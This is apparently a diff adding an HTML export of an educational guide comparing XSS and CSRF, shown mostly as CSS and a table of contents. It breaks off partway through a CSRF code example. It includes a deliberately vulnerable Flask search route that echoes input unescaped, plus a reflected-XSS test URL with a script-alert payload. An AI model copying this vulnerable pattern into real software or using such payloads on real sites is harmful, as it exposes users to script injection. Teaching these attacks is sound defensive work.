@@ -1,0 +1,780 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XSS vs CSRF - Comprehensive Comparison Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2d5562ad-76f0-803f-9d51-e570f1e47476" class="page mono"><header><h1 class="page-title" dir="auto"><strong>XSS vs CSRF - Comprehensive Comparison Guide</strong></h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2d5562ad-76f0-803c-ad1b-dd31663dedc6" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-807e-bff5-f41e76910e6a"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80b6-b83e-f2828106da95"><strong>What is XSS</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80fa-9317-c6f018d1a000"><strong>Basic Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8058-bd40-e1521ea0fe65"><strong>What is CSRF</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8089-a032-fce0ca948122"><strong>Basic Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8041-a0ba-fca3afa45bb7"><strong>Key Differences</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8001-ab4c-cf162345a5c7"><strong>1. Attack Goal</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80fa-8fcc-c1ad8b8577b4"><strong>2. What They Exploit</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80da-b2ed-e935cba8759e"><strong>3. Execution Location</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80bb-b79f-fe95fa5cedd3"><strong>4. Attack Vector</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8014-8ddb-d2901820dfdd"><strong>5. Target Audience</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805f-b940-e3d746f706ac"><strong>6. Requirements</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ec-bf80-d1590e249a79"><strong>7. Mitigation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8015-a31a-e4481acf2f9c"><strong>Similarities</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8074-a088-d215206cd1a0"><strong>1. Both are &quot;Cross-Site&quot; Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800d-9083-c1de2cac3c94"><strong>2. Both Exploit Trust</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-802e-a6e0-c11a49e6c093"><strong>3. Both Can Lead to Account Compromise</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d1-9219-fee901396e53"><strong>4. Both Require Defense in Depth</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8082-a639-fcd7c5022576"><strong>Attack Scenarios Comparison</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8034-98ab-f0d01c7496f1"><strong>Scenario 1: Account Takeover</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-804e-9f74-eeb66950dab1"><strong>Scenario 2: Data Theft</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ee-b647-e607a9f764d7"><strong>Scenario 3: Unauthorized Actions</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e1-be31-ea44088f96a3"><strong>Mitigation Comparison</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f8-8ba2-f689ca477fcd"><strong>XSS Mitigation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-807b-8824-df465d28499d"><strong>CSRF Mitigation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8046-96b6-e5114458fa9a"><strong>When They Work Together</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-803a-944d-c6ffe3d3ae54"><strong>Combined Attack: XSS + CSRF</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8039-8d56-f850d779127a"><strong>Decision Framework</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d0-a145-fee773ef38c5"><strong>When to Focus on XSS Protection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-803f-a71c-da7ff7846a64"><strong>When to Focus on CSRF Protection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-809d-b08e-d24d104bfc09"><strong>Always Protect Against Both</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c3-b2da-fa6279790081"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e4-8841-e4dbbd620f7d"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-807e-bff5-f41e76910e6a" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803e-ac93-c1fab5a0c465" class="">XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery) are two of the most common web application vulnerabilities. While both involve &quot;cross-site&quot; attacks, they are fundamentally different and require different mitigation strategies.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8047-84b3-d135321946fa" class=""><strong>Quick Summary:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8057-9f84-e173d57742d4" class="bulleted-list"><li style="list-style-type:disc"><strong>XSS</strong>: Attacker injects scripts into web pages → executes in victim&#x27;s browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b2-8c71-f62963bd1fcd" class="bulleted-list"><li style="list-style-type:disc"><strong>CSRF</strong>: Attacker tricks victim&#x27;s browser → submits requests to target site</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801b-bacf-e8a029a3d9b4"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80b6-b83e-f2828106da95" class=""><strong>What is XSS</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80da-8ff0-f4d2930cb442" class="">XSS (Cross-Site Scripting) occurs when an application fails to properly encode user-supplied input before including it in HTML output, allowing attackers to inject malicious JavaScript that executes in the victim&#x27;s browser.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80fa-9317-c6f018d1a000" class=""><strong>Basic Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c4-9dac-df200b9a64a7" class=""><strong>Vulnerable Code:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a4-9446-d05bf2d3cd7a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">@app.route(&#x27;/search&#x27;)
+def search():
+    query = request.args.get(&#x27;q&#x27;)
+    return f&quot;&lt;h1&gt;Results for: {query}&lt;/h1&gt;&quot;  # XSS!
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80df-9e06-f2219ce532d6" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8059-8795-d09ab8564d6a" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: /search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8090-b846-d7c61d51f60b" class=""><strong>Result:</strong> Script executes in victim&#x27;s browser</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80f9-8092-db028b47eaaa"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8058-bd40-e1521ea0fe65" class=""><strong>What is CSRF</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8049-b261-c9dfb2805840" class="">CSRF (Cross-Site Request Forgery) is an attack that tricks a user&#x27;s browser into making requests to a web application where the user is authenticated, causing the application to perform actions the user didn&#x27;t intend.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8089-a032-fce0ca948122" class=""><strong>Basic Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f0-8a8b-c26fe807a965" class=""><strong>Vulnerable Application:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8044-9d59-f0d2625f575f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">@app.route(&#x27;/transfer&#x27;, methods=[&#x27;POST&#x27;])
+def transfer():
+    amount = request.form.get(&#x27;amount&#x27;)
